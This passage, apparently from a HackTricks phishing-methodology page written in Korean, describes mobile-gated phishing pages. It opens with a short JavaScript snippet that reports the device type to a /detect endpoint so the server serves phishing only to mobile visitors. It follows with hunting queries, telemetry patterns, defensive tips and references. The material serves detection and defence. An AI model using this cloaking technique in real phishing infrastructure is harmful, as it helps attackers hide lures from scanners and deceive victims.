fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Server 행동에서 자주 관찰되는 사항:
- 첫 로드 중 세션 쿠키를 설정함.
- `POST /detect {"is_mobile":true|false}`를 수락함.
- 이후의 GET 요청에서 `is_mobile=false`이면 500(또는 placeholder)을 반환함; `true`일 때만 phishing을 제공함.

탐지 및 헌팅 휴리스틱:
- urlscan 쿼리: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: `GET /static/detect_device.js` → `POST /detect` → 비-mobile의 경우 HTTP 500 순서; 정상적인 mobile 피해자 경로는 후속 HTML/JS와 함께 200을 반환함.
- `ontouchstart` 또는 이와 유사한 device checks에만 의존해 콘텐츠를 조건부로 제공하는 페이지는 차단하거나 면밀히 검토할 것.

방어 팁:
- mobile-like fingerprints와 JS enabled 상태로 crawlers를 실행해 gated content를 드러내기.
- 새로 등록된 도메인에서 `POST /detect` 이후 발생하는 의심스러운 500 응답에 경고를 발생시킬 것.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
